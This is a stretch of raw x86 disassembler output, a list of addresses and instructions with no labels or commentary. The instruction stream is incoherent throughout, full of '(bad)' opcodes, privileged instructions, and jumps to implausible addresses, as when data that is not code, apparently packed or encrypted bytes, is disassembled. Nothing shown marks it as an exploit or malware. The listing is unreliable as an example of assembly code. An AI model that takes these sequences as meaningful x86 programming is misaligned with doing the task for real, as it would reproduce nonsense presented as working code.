  428b1f:	jmp    0x6b3e4cab
  428b24:	jmp    0x96a79754
  428b29:	cs cld 
  428b2b:	jmp    0x428b30
	...
  428b48:	add    BYTE PTR [eax],al
  428b4a:	mov    ebp,0x1a5c3c98
  428b4f:	mov    edi,ebp
  428b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b52:	inc    eax
  428b53:	xlat   BYTE PTR ds:[ebx]
  428b54:	xor    edx,eax
  428b56:	xor    DWORD PTR [edx],edi
  428b58:	adc    al,0xe9
  428b5a:	push   cs
  428b5b:	(bad)  
  428b5c:	mov    ah,dl
  428b5e:	dec    edx
  428b5f:	adc    BYTE PTR [eax+0x0],al
  428b62:	je     0x428ae9
  428b64:	inc    ecx
  428b65:	clc    
  428b66:	add    al,0xb5
  428b68:	inc    edx
  428b69:	add    DWORD PTR [edx+eax*1+0x53],esp
  428b6d:	(bad)  
  428b6e:	jmp    0xb44285fa
  428b73:	push   ebx
  428b74:	sti    
  428b75:	jne    0x428b57
  428b77:	hlt    
  428b78:	rol    BYTE PTR [ebp+0x39306fe4],cl
  428b7e:	inc    ecx
  428b7f:	jmp    0xf0:0x76b72f71
  428b86:	pop    eax
  428b87:	pop    ds
  428b88:	sti    
  428b89:	jne    0x428b63
  428b8b:	hlt    
  428b8c:	adc    esp,eax
  428b8e:	ss inc edx
  428b90:	cld    
  428b91:	imul   esi,esp,0xa98df478
  428b97:	jmp    0x5d65e2e8
  428b9c:	lock call FWORD PTR [ecx+0x79d6fbf5]
  428ba3:	les    esi,FWORD PTR [eax+0x9]
  428ba6:	int    0x76
  428ba8:	hlt    
  428ba9:	jne    0x428b93
  428bab:	mov    al,0xfd
  428bad:	jmp    0x0:0x0
	...
  428bcc:	out    0x2f,al
  428bce:	xlat   BYTE PTR ds:[ebx]
  428bcf:	jmp    FWORD PTR [ecx-0x18]
  428bd2:	sti    
  428bd3:	adc    eax,0x401220
  428bd8:	jecxz  0x428c38
  428bda:	clc    
  428bdb:	(bad)  
  428bdc:	mov    ecx,0xb4400f2d
  428be1:	lods   eax,DWORD PTR ds:[esi]
  428be2:	xlat   BYTE PTR ds:[ebx]
  428be3:	pop    ebx
  428be4:	fincstp 
  428be6:	mov    BYTE PTR [ebp-0x40ac8],al
  428bec:	hlt    
  428bed:	fld    TBYTE PTR [ebp+esi*1-0x4fa40b4d]
  428bf4:	jne    0x428c49
  428bf6:	(bad)
  428bf9:	in     al,dx
  428bfa:	xchg   bl,ch
  428bfc:	mov    gs,WORD PTR [ebx-0x38d78058]
  428c02:	push   ds
  428c03:	inc    eax
  428c04:	or     eax,0xc255cf18
  428c09:	mov    eax,ds:0xbb8b0c30
  428c0e:	add    BYTE PTR [eax],al
  428c10:	or     eax,0xcd76e44f
  428c15:	push   ss
  428c16:	xor    edx,DWORD PTR [edx]
  428c18:	loope  0x428c42
  428c1a:	sar    bh,0x89
  428c1d:	xlat   BYTE PTR ds:[ebx]
  428c1e:	add    eax,DWORD PTR [esp+edx*4-0x77ffffe9]
  428c25:	cmc    
  428c26:	lods   al,BYTE PTR ds:[esi]
  428c27:	jge    0x428bdc
  428c29:	cdq    
  428c2a:	repnz call FWORD PTR [esi+0xfcca6e]
	...
  428c4d:	add    BYTE PTR [eax],ah
  428c4f:	test   DWORD PTR [esi],0xfc9c0d40
  428c55:	or     BYTE PTR [edi],0x17
  428c58:	add    BYTE PTR [eax],al
  428c5a:	pop    ebp
  428c5b:	inc    DWORD PTR [edx-0x71]
  428c5e:	or     eax,0x88f78717
  428c63:	sub    eax,0xd8662ad
  428c68:	mov    ch,cl
  428c6a:	in     eax,0xc0
  428c6c:	cmp    edi,0x727eedca
  428c72:	mov    ebp,0xa5fc3b99
  428c77:	out    dx,al
  428c78:	cmp    bh,0xb2
  428c7b:	cmc    
  428c7c:	jge    0x428c55
  428c7e:	mov    ch,0x71
  428c80:	xchg   ebx,eax
  428c81:	jmp    DWORD PTR [edx+0x51734ca2]
  428c87:	rol    ebx,0x8a
  428c8a:	adc    bh,cl
  428c8c:	retf   
  428c8d:	out    0x61,eax
  428c8f:	(bad)  
  428c90:	cld    
  428c91:	add    ecx,DWORD PTR ds:0x8534132d
  428c97:	inc    esp
  428c98:	ss or  edi,0x771c362b
  428c9f:	jg     0x428c87
  428ca1:	add    ecx,DWORD PTR [ebx+eax*2-0x3657716]
  428ca8:	push   ebp
  428ca9:	inc    edi
  428caa:	push   0x12
  428cac:	push   0x41840d04
  428cb1:	mov    eax,0x0
	...
  428cce:	add    BYTE PTR [eax],al
  428cd0:	sbb    ebp,DWORD PTR ds:0x17322fd3
  428cd6:	push   edx
  428cd7:	xor    esi,DWORD PTR [ecx]
  428cd9:	sub    al,0xd3
  428cdb:	das    
  428cdc:	xor    bh,BYTE PTR [ebx+0x56]
  428cdf:	add    al,0xd
  428ce1:	sbb    ebp,esp
  428ce3:	popf   
  428ce4:	sbb    ah,BYTE PTR [ebx*1-0x72d3eed0]
  428ceb:	shl    DWORD PTR [ebp+0x39],1
  428cee:	sub    ecx,ebx
  428cf0:	xchg   ebp,eax
  428cf1:	sbb    al,0x69
  428cf3:	and    BYTE PTR [edx],ah
  428cf5:	iret   
  428cf6:	mov    esp,0x7e473dda
  428cfb:	jnp    0x428cd3
  428cfd:	mov    edi,0x79f27ee6
  428d02:	(bad)  [edi-0x3a]
  428d05:	mov    edi,0x57f77ce6
  428d0a:	sbb    al,bh
  428d0c:	retf   0xfb2a
  428d0f:	jecxz  0x428d2d
  428d11:	shl    dh,0x7e
  428d14:	dec    edi
  428d15:	clc    
  428d16:	mov    DWORD PTR [ebx-0x3a],esp
  428d19:	mov    edi,0xfc4f7ee6
  428d1e:	mov    DWORD PTR [ebx+0x7ee6bfd6],ebp
  428d24:	dec    edi
  428d25:	adc    BYTE PTR [eax],al
  428d27:	mov    ah,BYTE PTR [edx+0x37]
  428d2a:	inc    eax
  428d2b:	jmp    0x4a564b3b
  428d30:	(bad)  
  428d31:	ss inc eax
  428d33:	jmp    0x428d38
	...
  428d50:	add    BYTE PTR [eax],al
  428d52:	sti    
  428d53:	mov    ebp,0x607b0317
  428d58:	jae    0x428cf7
  428d5a:	push   ebx
  428d5b:	sub    ecx,DWORD PTR [ebx-0x792cfefc]
  428d61:	mov    ah,0x8e
  428d63:	aaa    
  428d64:	inc    eax
  428d65:	jmp    0xe9587f60
  428d6a:	push   cs
  428d6b:	jns    0x428d31
  428d6d:	mov    ecx,0x91327864
  428d72:	and    al,al
  428d74:	call   DWORD PTR [ebp-0x2c]
  428d77:	cwde   
  428d78:	xor    BYTE PTR [edx-0x16bfc8a2],cl
  428d7e:	lea    esp,[esi+0x5f6a1ef]
  428d84:	push   ss
  428d85:	jmp    0x9a070698
  428d8a:	aas    
  428d8b:	out    dx,al
  428d8c:	jg     0x428dc3
  428d8e:	retf   
  428d8f:	sub    bh,ch
  428d91:	aaa    
  428d92:	cwde   
  428d93:	out    dx,al
  428d94:	mov    al,ds:0xffc0326d
  428d99:	pop    ebx
  428d9a:	popf   
  428d9b:	sbb    dl,BYTE PTR [edi+0x11]
  428d9e:	or     BYTE PTR [edx],dl
  428da0:	add    cl,ch
  428da2:	pop    ebx
  428da3:	inc    esp
  428da4:	dec    edi
  428da5:	neg    dl
  428da7:	stos   BYTE PTR es:[edi],al
  428da8:	retf   
  428da9:	stos   BYTE PTR es:[edi],al
  428daa:	push   cs
  428dab:	sub    eax,0x5fba53d5
  428db0:	imul   ebp,DWORD PTR [ebp+0x548b2ad0],0x0
	...
  428dd3:	add    BYTE PTR [ecx],dl
  428dd5:	shl    edi,cl
  428dd7:	mov    BYTE PTR [edx],0x0
  428dda:	add    BYTE PTR [eax],al
  428ddc:	pop    ds
  428ddd:	mov    ecx,0x7ea1ff4c
  428de2:	enter  0xa443,0xef
  428de6:	shl    BYTE PTR [ebx+0x3fc008],cl
  428dec:	ins    DWORD PTR es:[edi],dx
  428ded:	stc    
  428dee:	outs   dx,DWORD PTR ds:[esi]
  428def:	int3   
  428df0:	daa    
  428df1:	add    al,0x74
  428df3:	sbb    ebx,DWORD PTR [ebp-0x7]
  428df6:	or     esp,0x37
  428df9:	add    al,0x74
  428dfb:	adc    ecx,DWORD PTR [ebp-0x7]
  428dfe:	imul   ecx,esp,0x27
  428e01:	add    al,0x74
  428e03:	or     esp,DWORD PTR [edx-0x83435fe]
  428e09:	add    edi,ebp
  428e0b:	cmp    dh,bh
  428e0d:	jb     0x428e11
  428e0f:	mov    BYTE PTR [ecx],bh
  428e11:	in     al,dx
  428e12:	mov    DWORD PTR [ebx+0x24],0xed5b5a4f
  428e19:	rcl    DWORD PTR [eax],0x0
  428e1c:	sub    DWORD PTR [ebx+0x5fc883e8],0x424e5752
  428e26:	dec    edi
  428e27:	call   0x3f1bec
  428e2c:	sahf   
  428e2d:	and    BYTE PTR [ecx-0x1bc39f83],cl
  428e33:	mov    ecx,?
  428e35:	std    
  428e36:	jmp    FWORD PTR [ecx+0x0]
	...
  428e55:	add    BYTE PTR [eax-0x533f8656],ch
  428e5b:	add    eax,0xfde4157e
  428e60:	xchg   BYTE PTR [ebp-0x4c],dh
  428e63:	lods   al,BYTE PTR ds:[esi]
  428e64:	jns    0x428e72
  428e66:	imul   eax,DWORD PTR [ecx-0x24],0x56025e50
  428e6d:	push   edi
  428e6e:	fadd   QWORD PTR [edi+0x520dff4a]
  428e74:	test   DWORD PTR [edi+0x14ca31a],edi
  428e7a:	or     eax,0x3d079a17
  428e7f:	scas   al,BYTE PTR es:[edi]
  428e80:	(bad)
  428e83:	in     al,0x77
  428e85:	out    0xd,eax
  428e87:	fadd   QWORD PTR [ebx]
  428e89:	add    BYTE PTR [eax+0x5382ff57],cl
  428e8f:	adc    eax,0xdc800000
  428e94:	pop    ds
  428e95:	dec    edi
  428e96:	not    DWORD PTR [edi]
  428e98:	(bad)  
  428e99:	push   esp
  428e9a:	jne    0x428eaa
  428e9c:	ret    0x5afc
  428e9f:	mov    al,0xc5
  428ea1:	ror    DWORD PTR [eax+0x7b83ff57],cl
  428ea7:	adc    eax,0x248e0000
  428eac:	sbb    al,0xff
  428eae:	or     esp,DWORD PTR [ebx+0x170d0164]
  428eb4:	jge    0x428ef8
  428eb6:	xor    eax,0xff9a67
	...
  428ed7:	add    BYTE PTR [eax-0x34b9e777],bh
  428edd:	jmp    0xe30b1511
  428ee2:	test   DWORD PTR [edi+0x17ca31a],edi
  428ee8:	or     eax,0xe57a8317
  428eed:	push   ss
  428eee:	inc    DWORD PTR [ebx+0x148f]
  428ef4:	cwde   
  428ef5:	arpl   WORD PTR [eax],si
  428ef7:	dec    edi
  428ef8:	nop
  428ef9:	pop    ebx
  428efa:	inc    eax
  428efb:	dec    edi
  428efc:	inc    ebx
  428efd:	xchg   edx,eax
  428efe:	sbb    BYTE PTR [edx],ah
  428f00:	inc    ebx
  428f01:	xor    ch,BYTE PTR [esi+eax*4]
  428f04:	push   eax
  428f05:	jbe    0x6b42a1ca
  428f0b:	pushf  
  428f0c:	or     al,0x0
  428f0e:	out    0x82,eax
  428f10:	aaa    
  428f11:	xor    dh,ah
  428f13:	dec    BYTE PTR [esi+0xd03e8c9]
  428f19:	jnp    0x428f46
  428f1b:	sub    BYTE PTR [edx-0x6a],cl
  428f1e:	jmp    0xe95ac8f8
  428f23:	mov    ebp,0xc95f2889
  428f28:	dec    edx
  428f29:	and    BYTE PTR [esi-0x173e7101],0x3
  428f30:	or     eax,0x6a380b7d
  428f35:	xchg   esi,eax
  428f36:	rol    BYTE PTR [eax+0x1c1e93e7],0x0
	...
  428f59:	add    BYTE PTR [ebx-0x79fc18ed],bl
  428f5f:	ret    0xd46e
  428f62:	xchg   ebp,eax
  428f63:	inc    eax
  428f64:	push   ss
  428f65:	(bad)  
  428f66:	inc    ecx
  428f67:	mov    dl,0xf2
  428f69:	sbb    esp,DWORD PTR [ebx-0x46]
  428f6c:	pop    ebp
  428f6d:	das    
  428f6e:	(bad)  
  428f6f:	aas    
  428f70:	fcmovb st,st(2)
  428f72:	lea    ebp,[edx-0x7beffbb2]
  428f78:	fild   WORD PTR [ecx]
  428f7a:	or     eax,0x1ab16a00
  428f7f:	cmc    
  428f80:	in     eax,0x86
  428f82:	sbb    DWORD PTR [edx],eax
  428f84:	out    0x3,eax
  428f86:	pop    ebp
  428f87:	jnp    0x428f34
  428f89:	sub    eax,DWORD PTR [edi+0x31c42ad]
  428f8f:	scas   al,BYTE PTR es:[edi]
  428f90:	out    0x3,al
  428f92:	xchg   esi,eax
  428f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f94:	adc    bh,BYTE PTR [ebx-0x48]
  428f97:	sbb    BYTE PTR [eax+0x4f000d11],ch
  428f9d:	add    al,BYTE PTR [eax]
  428f9f:	jge    0x428fa0
  428fa1:	not    DWORD PTR [ecx]
  428fa3:	add    BYTE PTR [eax],al
  428fa5:	(bad)  
  428fa6:	aam    0x23
  428fa8:	ss sub al,0xf5
  428fab:	repz add esp,0x9
  428fb2:	aam    0x33
  428fb4:	call   0xe3ed1f9c
  428fb9:	jmp    0xe9181259
	...
  428fda:	add    BYTE PTR [eax],al
  428fdc:	push   cs
  428fdd:	add    BYTE PTR [ecx+0x3c892c],cl
  428fe3:	jmp    0x428ff3
  428fe5:	add    BYTE PTR [eax],al
  428fe7:	jb     0x429037
  428fe9:	adc    ebp,DWORD PTR [edx-0x1a]
  428fec:	retf   
  428fed:	rcr    edi,0xd8
  428ff0:	push   cs
  428ff1:	add    BYTE PTR [eax],al
  428ff3:	das    
  428ff4:	xchg   esp,eax
  428ff5:	addr16 jge 0x428fb5
  428ff8:	ds and al,0x12
  428ffb:	stc    
  428ffc:	adc    al,al
  428ffe:	dec    DWORD PTR [edi]
  429000:	enter  0xdbc1,0x64
  429004:	into   
  429005:	mov    dl,0x22
  429007:	rol    DWORD PTR [eax+0x7a],cl
  42900a:	jp     0x428f9d
  42900c:	inc    esi
  42900d:	pop    ds
  42900e:	sub    edi,ebp
  429010:	push   cs
  429011:	add    BYTE PTR [ecx+0x698d29c],cl
  429017:	jb     0x428fec
  429019:	push   ds
  42901a:	retf   0xe6f
  42901d:	add    BYTE PTR [ebx+0x69f8c529],al
  429023:	loope  0x429070
  429025:	ret    0xd9df
  429028:	push   cs
  429029:	add    BYTE PTR [eax],al
  42902b:	mov    edi,0x62efc277
  429030:	int    0x1a
  429032:	or     al,0x56
  429034:	sbb    BYTE PTR [eax],al
  429036:	mov    BYTE PTR [eax],0x61
  429039:	aas    
  42903a:	add    al,0x1
  42903c:	imul   eax,ebx,0x570
	...
  42905e:	or     al,0xc6
  429060:	mov    DWORD PTR [eax],eax
  429062:	mov    ah,0xa3
  429064:	aas    
  429065:	or     BYTE PTR [ecx],ch
  429067:	mov    esp,0x3f3f0871
  42906c:	lock jmp 0x4293ca
  429072:	das    
  429073:	aam    0x87
  429075:	inc    ebp
  429076:	les    eax,FWORD PTR [ebx]
  429078:	ficom  WORD PTR [ebx]
  42907a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42907b:	add    al,BYTE PTR [edi+0x47a8c445]
  429081:	or     BYTE PTR [edx*8-0x1b98278f],ah
  429088:	dec    ebp
  429089:	mov    DWORD PTR [edi],edx
  42908b:	add    al,ch
  42908d:	lock icebp 
  42908f:	sti    
  429090:	inc    DWORD PTR [eax]
  429092:	aaa    
  429093:	add    BYTE PTR [edi+0x357b784d],al
  429099:	das    
  42909a:	fild   WORD PTR [eax+0x8]
  42909d:	je     0x4290cd
  42909f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290a0:	dec    edi
  4290a1:	or     BYTE PTR [edx-0x9],ch
  4290a4:	comiss xmm6,DWORD PTR [ebx+0x698b0840]
  4290ab:	push   es
  4290ac:	dec    ebp
  4290ad:	push   ecx
  4290ae:	scas   eax,DWORD PTR es:[edi]
  4290af:	push   0x2a6f0308
  4290b4:	dec    ebp
  4290b5:	call   0x3f37a5
  4290ba:	and    eax,0xb78b083f
  4290bf:	and    eax,0x4b87
	...
  4290e0:	in     al,dx
  4290e1:	xchg   DWORD PTR [ecx],ebp
  4290e3:	(bad)  
  4290e4:	call   0x91cf8d12
  4290e9:	rcl    DWORD PTR [eax+ebp*8+0xd],1
  4290ed:	mov    ds:0xc40d000e,al
  4290f2:	(bad)  
  4290f3:	idiv   DWORD PTR ds:0xd24f42b2
  4290f9:	lods   al,BYTE PTR ds:[esi]
  4290fa:	adc    ch,bh
  4290fc:	inc    eax
  4290fd:	sbb    ebx,DWORD PTR [eax]
  4290ff:	sahf   
  429100:	push   ecx
  429101:	push   ss
  429102:	sub    eax,DWORD PTR [edx-0x76eb3c33]
  429108:	cmp    BYTE PTR [edi],bl
  42910a:	test   ebp,esi
  42910c:	and    DWORD PTR ds:0x3fcb88d0,ebx
  429112:	mov    eax,0x79170d72
  429117:	inc    eax
  429118:	std    
  429119:	scas   eax,DWORD PTR es:[edi]
  42911a:	scas   eax,DWORD PTR es:[edi]
  42911b:	adc    edx,DWORD PTR [esi+0xd893fd4]
  429121:	adc    edx,eax
  429123:	jb     0x42912e
  429125:	call   0xc606:0xc09e7ad
  42912c:	into   
  42912d:	cs add ecx,ebp
  429130:	sti    
  429131:	xor    al,bl
  429133:	or     al,0x90
  429135:	pop    es
  429136:	sub    edi,esp
  429138:	push   edx
  429139:	call   0x4585:0x1e0ee7ad
  429140:	inc    edx
  429141:	xchg   esi,eax
  429142:	sub    eax,ebp
	...
  429160:	add    BYTE PTR [eax],al
  429162:	into   
  429163:	inc    BYTE PTR [ebx]
  429165:	push   0xffffffe6
  429167:	xchg   ebx,eax
  429168:	lods   eax,DWORD PTR ds:[esi]
  429169:	mov    ds:0x10d6bec5,eax
  42916e:	or     eax,0x15427d17
  429173:	xchg   DWORD PTR [edi-0x3c],esi
  429176:	mov    ebp,0xa0fb5e5
  42917b:	fs cld 
  42917d:	out    0x4d,eax
  42917f:	sub    DWORD PTR [ebx],0xfffffffc
  429182:	nop
  429183:	jmp    DWORD PTR [esi]
  429185:	mov    bh,0x1f
  429187:	jns    0x42911c
  429189:	sub    ecx,DWORD PTR [edi+0x52fd9a2d]
  42918f:	jns    0x4291b5
  429191:	sbb    esi,ecx
  429193:	stos   DWORD PTR es:[edi],eax
  429194:	out    0x3,al
  429196:	mov    al,al
  429198:	fidivr DWORD PTR [edx+0x3d]
  42919b:	loopne 0x4291fe
  42919d:	(bad)  
  42919e:	scas   al,BYTE PTR es:[edi]
  42919f:	jb     0x42913f
  4291a1:	sub    al,0x3b
  4291a3:	daa    
  4291a4:	in     eax,0x2b
  4291a6:	add    DWORD PTR [eax],eax
  4291a8:	push   esi
  4291a9:	std    
  4291aa:	xchg   ebp,eax
  4291ab:	mov    dl,0x9e
  4291ad:	jge    0x429204
  4291af:	fcomp  QWORD PTR [edi-0x39]
  4291b2:	repnz cdq 
  4291b4:	adc    al,0x79
  4291b6:	pop    ss
  4291b7:	pop    esp
  4291b8:	push   ds
  4291b9:	sbb    al,0x67
  4291bb:	adc    edi,esp
  4291bd:	add    edx,DWORD PTR [esi-0x7a2b5146]
  4291c3:	cmp    al,0x36
  4291c5:	sub    eax,DWORD PTR [eax]
	...
  4291e3:	add    bh,bh
  4291e5:	setle  BYTE PTR [ecx-0x4066e7ea]
  4291ec:	popa   
  4291ed:	and    al,0x61
  4291ef:	xor    al,0x8f
  4291f1:	sub    eax,0xa28ddbfa
  4291f6:	jle    0x4291fc
  4291f8:	ret    
  4291f9:	loope  0x42925e
  4291fb:	(bad)  
  4291fc:	repnz iret 
  4291fe:	pop    ebx
  4291ff:	(bad)  
  429200:	out    0xcf,al
  429202:	gs mov cl,0x3a
  429205:	js     0x42922b
  429207:	sbb    al,0x17
  429209:	mov    ch,0x55
  42920b:	sub    ecx,DWORD PTR [esi-0x7a082cc1]
  429211:	mov    edx,0x812ad23e
  429216:	mov    dl,0x3
  429218:	or     eax,0xf2a9ff79
  42921d:	sbb    esi,DWORD PTR [eax-0x79dbd8d7]
  429223:	stos   BYTE PTR es:[edi],al
  429224:	into   
  429225:	js     0x429269
  429227:	icebp  
  429228:	imul   eax,eax,0x257e0003
  42922e:	cld    
  42922f:	push   cs
  429230:	xchg   edx,eax
  429231:	cmp    edi,esp
  429233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429234:	les    edi,FWORD PTR [edx]
  429236:	shr    ebp,0xe
  429239:	iret   
  42923a:	mov    BYTE PTR ds:0x9a23178a,al
  429240:	cmp    ecx,DWORD PTR [ebx-0x78]
  429243:	sub    al,0x19
  429245:	add    ecx,eax
  429247:	aaa    
	...
  429264:	add    BYTE PTR [eax],al
  429266:	pop    ebp
  429267:	clc    
  429268:	out    0x9,eax
  42926a:	and    eax,0xde62fc23
  42926f:	jge    0x429266
  429271:	cmp    al,0xe
  429273:	icebp  
  429274:	mov    edi,0xfc22e2d0
  429279:	jmp    0x5c6c2bdd
  42927e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42927f:	inc    edi
  429280:	push   edi
  429281:	xchg   ecx,eax
  429282:	pop    eax
  429283:	adc    DWORD PTR [eax],eax
  429285:	jmp    0x3a3e506f
  42928a:	loop   0x4292c7
  42928c:	dec    edi
  42928d:	cmp    ah,BYTE PTR [esi]
  42928f:	scas   al,BYTE PTR es:[edi]
  429290:	pop    es
  429291:	xchg   ecx,eax
  429292:	jo     0x42924c
  429294:	cld    
  429295:	jle    0x429260
  429297:	mov    ebp,0xaece6cf7
  42929c:	bound  eax,QWORD PTR [ebx]
  42929e:	cmp    esi,DWORD PTR [esi+0x42]
  4292a1:	push   ebp
  4292a2:	pop    esi
  4292a3:	and    al,0x72
  4292a5:	stc    
  4292a6:	test   DWORD PTR ds:0x234eff70,0x76222581
  4292b0:	inc    edx
  4292b1:	add    BYTE PTR [eax+0x3015fb4e],bh
  4292b7:	or     eax,0x506f0040
  4292bc:	hlt    
  4292bd:	sub    esp,DWORD PTR [ecx-0x6e00b1da]
  4292c3:	es push edx
  4292c5:	call   0x3f3d91
	...
  4292e6:	add    BYTE PTR [eax],al
  4292e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292ea:	dec    ecx
  4292eb:	in     al,dx
  4292ec:	xchg   ebp,eax
  4292ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292ee:	or     BYTE PTR [edx],dh
  4292f0:	jne    0x4292f8
  4292f2:	and    cl,BYTE PTR [esp+esi*4-0x49c37702]
  4292f9:	mov    eax,ds:0xb4cffc41
  4292fe:	daa    
  4292ff:	fsub   DWORD PTR [edi-0x1bac0b9f]
  429305:	stos   BYTE PTR es:[edi],al
  429306:	add    BYTE PTR [esi],bh
  429308:	in     al,0x3
  42930a:	or     cl,BYTE PTR [esp+eiz*4-0x37ba7702]
  429311:	dec    ebx
  429312:	add    si,WORD PTR [edi-0x2d]
  429316:	push   ebx
  429317:	push   esi
  429318:	dec    esp
  429319:	stc    
  42931a:	inc    esi
  42931b:	jmp    FWORD PTR [ebx+0x7e75bca2]
  429321:	push   eax
  429322:	in     al,0xb8
  429324:	(bad)  
  429326:	push   DWORD PTR [edx]
  429328:	mov    ah,0x4
  42932a:	push   ss
  42932b:	inc    DWORD PTR [ecx]
  42932d:	or     al,0xfb
  42932f:	jne    0x429389
  429331:	dec    esi
  429332:	in     al,0xe4
  429334:	mov    edi,0xf18afffb
  429339:	jne    0x2803426f
  42933f:	inc    ebp
  429340:	test   al,0xfc
  429342:	inc    eax
  429343:	adc    BYTE PTR [ebx+0x38],ch
  429346:	push   edi
  429347:	leave  
  429348:	or     eax,0x13d7
	...
  429369:	add    al,al
  42936b:	popf   
  42936c:	pop    ss
  42936d:	and    BYTE PTR [ecx],0x3c
  429370:	and    DWORD PTR [edx-0x6f],0x17
  429374:	jne    0x4293b8
  429376:	mov    DWORD PTR [edi-0x2dfa8dd9],eax
  42937c:	or     al,0xac
  42937e:	rcl    DWORD PTR [esi+0x0],0x57
  429382:	inc    esp
  429383:	pushf  
  429384:	inc    ebx
  429385:	jb     0x429392
  429387:	push   edi
  429388:	jmp    0x2ce1ccf
  42938d:	xor    ebp,ecx
  42938f:	lock inc ebp
  429391:	add    ecx,DWORD PTR ds:0xe973278a
  429397:	push   ds
  429398:	daa    
  429399:	adc    ch,BYTE PTR [ebp+0x3]
  42939c:	ret    
  42939d:	inc    DWORD PTR [edi-0x557d36e1]
  4293a3:	retf   
  4293a4:	aam    0x7f
  4293a6:	loopne 0x429404
  4293a8:	cmp    eax,DWORD PTR [eax+0xd]
  4293ab:	pop    ss
  4293ac:	lods   al,BYTE PTR ds:[esi]
  4293ad:	and    esp,DWORD PTR [ebp-0x7500d342]
  4293b3:	fwait
  4293b4:	inc    eax
  4293b5:	jae    0x4293dd
  4293b7:	add    DWORD PTR [edx-0x79],ebp
  4293ba:	dec    ecx
  4293bb:	(bad)  
  4293bc:	add    edx,DWORD PTR [esi+0x72]
  4293bf:	and    al,0x8
  4293c1:	adc    cl,ch
  4293c3:	push   ss
  4293c4:	iret   
  4293c5:	out    0xc0,eax
  4293c7:	and    DWORD PTR [edi],0xfffffffc
  4293ca:	ret    
  4293cb:	jno    0x4293da
  4293cd:	sbb    al,0x0
	...
  4293eb:	add    bh,bh
  4293ed:	(bad)  
  4293ee:	add    ebx,DWORD PTR [esi-0x6a]
  4293f1:	pop    edx
  4293f2:	mov    eax,0x737b00de
  4293f8:	icebp  
  4293f9:	inc    edx
  4293fa:	into   
  4293fb:	cld    
  4293fc:	sbb    BYTE PTR [eax],al
  4293fe:	fbstp  TBYTE PTR [edi]
  429400:	int    0xff
  429402:	jno    0x42944f
  429404:	mov    ebx,0xe3ae317a
  429409:	jp     0x42945f
  42940b:	scas   eax,DWORD PTR es:[edi]
  42940c:	(bad)  
  42940e:	jmp    0x42944d
  429410:	aad    0xbc
  429412:	out    0xaf,al
  429414:	aaa    
  429415:	sbb    cl,bh
  429417:	cs cli 
  429419:	and    BYTE PTR [edx+0x43],ah
  42941c:	jle    0x4293fa
  42941e:	mov    ebp,0xa9339268
  429423:	add    edi,DWORD PTR [eax]
  429425:	and    ebx,edi
  429427:	or     edi,edi
  429429:	mov    edi,0x2be71be6
  42942e:	add    eax,0xfd278d28
  429433:	scas   al,BYTE PTR es:[edi]
  429434:	nop/reserved BYTE PTR [ecx+0x31]
  429438:	mov    ecx,0x1f289520
  42943d:	add    al,0xf9
  42943f:	ret    
  429440:	stos   BYTE PTR es:[edi],al
  429441:	sar    DWORD PTR [ebx+edi*2],0xcd
  429445:	les    ebp,FWORD PTR [ecx+0x52a785cf]
  42944b:	fistp  DWORD PTR [edx]
  42944d:	test   al,0x3a
  42944f:	in     al,dx
	...
  42946c:	add    BYTE PTR [eax],al
  42946e:	inc    ebp
  42946f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429470:	add    bh,al
  429472:	xchg   ebp,eax
  429473:	mov    bh,0x36
  429475:	test   edi,0xdf802a3
  42947b:	mov    eax,0x20dbcf1e
  429480:	adc    ah,al
  429482:	adc    bl,BYTE PTR [eax]
  429484:	test   DWORD PTR [edx+0x5a],edi
  429487:	and    bh,ah
  429489:	stos   DWORD PTR es:[edi],eax
  42948a:	fidiv  DWORD PTR [esi+ebp*1-0x54]
  42948e:	add    eax,0x8b0f2b8
  429493:	cmp    bh,0xf0
  429496:	and    BYTE PTR gs:[eax-0x24],dh
  42949a:	xchg   esi,eax
  42949b:	js     0x429468
  42949d:	stos   BYTE PTR es:[edi],al
  42949e:	push   cs
  42949f:	and    edx,DWORD PTR [edx]
  4294a1:	std    
  4294a2:	cld    
  4294a3:	mov    edi,0xa02941ff
  4294a8:	ja     0x429477
  4294aa:	push   cs
  4294ab:	retf   0xda73
  4294ae:	xchg   edi,ebp
  4294b0:	out    0x66,eax
  4294b2:	cmp    eax,0x296afc1c
  4294b7:	sbb    al,0x73
  4294b9:	rcl    BYTE PTR [esi],1
  4294bb:	cli    
  4294bc:	cmc    
  4294bd:	xor    ch,BYTE PTR es:[eax]
  4294c0:	adc    DWORD PTR [ecx+ebx*4-0x51],ebp
  4294c4:	cld    
  4294c5:	fcomip st,st(6)
  4294c7:	lods   eax,DWORD PTR ds:[esi]
  4294c8:	mov    ecx,ebp
  4294ca:	push   cs
  4294cb:	stos   BYTE PTR es:[edi],al
  4294cc:	setg   BYTE PTR [esi]
  4294cf:	mov    ebp,0xe988
	...
  4294f0:	push   cs
  4294f1:	test   al,0x87
  4294f3:	and    eax,0xd4fd1fce
  4294f8:	or     dh,dl
  4294fa:	aas    
  4294fb:	jmp    0x3f071dd0
  429500:	dec    edi
  429501:	pop    es
  429502:	add    BYTE PTR [edx+0x11],ah
  429505:	cmp    DWORD PTR [edi-0x7737f9ab],0x1d
  42950c:	ins    DWORD PTR es:[edi],dx
  42950d:	add    ecx,DWORD PTR [edx-0x67fe12b]
  429513:	in     al,0xaa
  429515:	add    al,BYTE PTR [eax+0x69274b3]
  42951b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42951c:	imul   ecx,DWORD PTR [eax+0x318c31cf],0x2cc8f72
  429526:	add    BYTE PTR [esi+edx*8],dh
  429529:	sub    al,BYTE PTR [eax+0x7deb9800]
  42952f:	in     al,dx
  429530:	fadd   DWORD PTR [edx]
  429532:	add    BYTE PTR [eax],al
  429534:	pop    ss
  429535:	dec    esi
  429536:	xchg   DWORD PTR [ebp+0x2c],esi
  429539:	call   0x4485:0x336b0842
  429540:	or     BYTE PTR [eax],cl
  429542:	sti    
  429543:	adc    eax,0x3ff0e8
  429548:	lods   eax,DWORD PTR ds:[esi]
  429549:	pop    esi
